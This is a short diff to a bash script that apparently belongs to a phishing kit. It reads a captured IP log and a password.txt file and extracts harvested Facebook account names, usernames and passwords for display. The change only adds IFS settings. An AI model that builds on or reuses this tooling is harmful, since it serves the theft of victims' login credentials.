@@ -10,7 +10,9 @@ cat site/$server/ip.txt >> saved.ip.txt
 
 password(){
 facebook=$(grep -o 'akun:*' site/$server/password.txt | cut -d ":" -f2 )
+IFS=$'\n'
 password=$(grep -o 'password:*' site/$server/password.txt | cut -d ":" -f2 )
+IFS=$'\n'
 username=$(grep -o 'Account:*' site/server/password.txt | cut -d ":" -f2 )
 printf '\n'
 printf "\033[34;1m[\033[31;1m+\033[34;1m]\033[33;1mAkun Fb:" $facebook
